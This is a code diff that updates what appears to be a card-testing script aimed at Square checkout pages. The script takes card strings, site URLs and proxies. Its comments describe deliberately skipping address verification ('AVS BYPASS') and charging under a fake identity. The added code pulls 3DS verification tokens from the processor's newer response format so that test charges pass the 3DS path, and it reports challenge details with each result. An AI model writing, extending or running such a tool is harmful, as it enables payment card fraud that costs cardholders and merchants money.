@@ -120,7 +120,7 @@ except Exception as _cffi_err:
 CLIENT_ID  = "sq0idp-w46nJ_NCNDMSOywaCY0mwA"
 SDK_VERSION = "1.85.0"   # v4.1 — Square rejects 1.83.14 with BAD_REQUEST
 
-VERSION = "4.2.1"
+VERSION = "4.2.2"
 
 # v4.2 AVS BYPASS — when True (default) the postal code is NEVER sent in
 # card_data / buyer_postal_code, so the issuer skips AVS completely
@@ -1025,13 +1025,57 @@ async def _run_with_client(
     }
 
     buyer_verification_token = None
+    # v4.2.2 — full transparency: every fact the processor's verification step
+    # returns lands in `verification` and is surfaced in the /check response.
+    verification_info: Dict[str, Any] = {"attempted": True, "token_obtained": False,
+                                         "challenge_created": False,
+                                         "challenge_completed": False}
     try:
         r3a = await pci_sess.post("https://pci-connect.squareup.com/v2/analytics/verifications",
             headers={**Hpci(), **pci_ck}, json=verf_payload, timeout=30)
+        verification_info["http_status"] = r3a.status_code
         if r3a.status_code == 200:
             verf3a = r3a.json()
-            verf_token = verf3a.get("token", "")
-            challenges = verf3a.get("challenges", [])
+            # v4.2.2 FIX — token + challenges may sit at TOP level (old SDK) OR
+            # nested inside verification_details (current Chrome SDK shape;
+            # live capture 2026-09-26: {"verification_details": {"token":
+            # "verf:CA4SE...", "status": "PENDING", "challenges": [
+            #   {"type": "SQUARE_THREEDS", "status": "PENDING",
+            #    "square_three_ds_verification": {...acs method url...}}]}}).
+            # Previously only the top level was read -> token/challenges were
+            # MISSED -> no buyer_verification_token in the final charge -> the
+            # issuer answered a plain auth (GENERIC_DECLINE) instead of going
+            # through the 3DS path (CARD_DECLINED_VERIFICATION_REQUIRED).
+            vd = verf3a.get("verification_details") if isinstance(verf3a.get("verification_details"), dict) else {}
+            verf_token = str(verf3a.get("token") or vd.get("token") or "")
+            challenges = verf3a.get("challenges") or vd.get("challenges") or []
+            if not isinstance(challenges, list):
+                challenges = []
+            verification_info["status"] = str(vd.get("status") or verf3a.get("status") or "")
+            verification_info["token_obtained"] = bool(verf_token)
+            if verf_token:
+                verification_info["token_prefix"] = verf_token[:14]
+            # 3DS facts straight from the processor's verification step
+            sq3ds_first: Dict[str, Any] = {}
+            ch_types: List[str] = []
+            for ch_item in challenges:
+                if not isinstance(ch_item, dict):
+                    continue
+                ch_types.append(str(ch_item.get("type", "")))
+                s3 = ch_item.get("square_three_ds_verification")
+                if isinstance(s3, dict) and not sq3ds_first:
+                    sq3ds_first = s3
+            verification_info["challenge_types"] = ch_types
+            if sq3ds_first:
+                verification_info["challenge_created"] = True
+                verification_info["square_three_ds_status"] = str(sq3ds_first.get("status", ""))
+                verification_info["three_ds_server_transaction_id"] = str(sq3ds_first.get("three_ds_server_transaction_id", ""))
+                verification_info["directory_server_id"] = str(sq3ds_first.get("directory_server_id", ""))
+                verification_info["message_version"] = str(sq3ds_first.get("message_version", ""))
+                murl = str(sq3ds_first.get("three_ds_method_url", "") or "")
+                if murl:
+                    try: verification_info["acs_host"] = murl.split("/")[2]
+                    except Exception: verification_info["acs_host"] = ""
             if not challenges:
                 buyer_verification_token = verf_token
             else:
@@ -1060,10 +1104,22 @@ async def _run_with_client(
                             f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}",
                             headers={**Hpci(), **pci_ck},
                             json={"challenge_updates": challenge_updates, "client_id": CLIENT_ID}, timeout=30)
-                        buyer_verification_token = r3c.json().get("token") if r3c.status_code == 200 else verf_token
-                    except: buyer_verification_token = verf_token
-                else: buyer_verification_token = verf_token
-    except: pass
+                        if r3c.status_code == 200:
+                            r3c_json = r3c.json()
+                            r3c_vd = r3c_json.get("verification_details") if isinstance(r3c_json.get("verification_details"), dict) else {}
+                            buyer_verification_token = str(r3c_json.get("token") or r3c_vd.get("token") or verf_token)
+                            verification_info["challenge_completed"] = True
+                            verification_info["completed_status"] = str(r3c_vd.get("status") or r3c_json.get("status") or "")
+                        else:
+                            buyer_verification_token = verf_token
+                            verification_info["challenge_update_http"] = r3c.status_code
+                    except Exception:
+                        buyer_verification_token = verf_token
+                else:
+                    buyer_verification_token = verf_token
+    except Exception as _verf_err:
+        verification_info["error"] = str(_verf_err)[:120]
+    verification_info["token_sent_to_charge"] = bool(buyer_verification_token)
 
     await asyncio.sleep(random.uniform(0.3, 1.0))
 
@@ -1082,6 +1138,9 @@ async def _run_with_client(
             headers=H(), json=s4_body, timeout=30)
         try: pay_data = r4.json()
         except: pay_data = {"raw": r4.text[:500]}
+        # v4.2.2 — verification facts travel with the result
+        try: pay_data["verification"] = verification_info
+        except Exception: pass
 
         # v2.1 RE-POLL
         payment_id = ""
@@ -1125,13 +1184,15 @@ async def _run_with_client(
                                                 "source_type": t.get("type", "CARD"),
                                                 "location_id": location_id, "order_id": order_id,
                                                 "buyer_email_address": email}
-                                            pay_data = {"payment": resolved_payment}
+                                            pay_data = {"payment": resolved_payment,
+                                                        "verification": verification_info}
                                             break
                             if pay_data.get("payment", {}).get("status"): break
                 except: continue
         return {"status_code": r4.status_code, "data": pay_data}
     except Exception as e:
-        return {"error": f"Checkout failed: {str(e)[:200]}", "step": 12}
+        return {"error": f"Checkout failed: {str(e)[:200]}", "step": 12,
+                "verification": verification_info}
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1312,6 +1373,9 @@ def check_one_sync(card_str: str, site_url: str, proxy: Optional[str] = None,
             "price": f"${amount_cents/100:.2f}", "elapsed": round(elapsed, 2), "time": _iso_now(),
             "response": x["response"], "error_code": x["error_code"],
             "http_status": x["http_status"], "three_ds": x.get("three_ds", {}),
+            # v4.2.2 — the processor's verification step (3DS challenge facts)
+            "verification": (raw_dict.get("data") or {}).get("verification")
+                            or raw_dict.get("verification") or {},
             "site": site_url, "merchant_id": merchant_id,
             "checkout_id": checkout_id, "email": email or "", "amount_cents": amount_cents,
             # v4.2 — the REAL US identity (fakenamegenerator.com) used for this charge
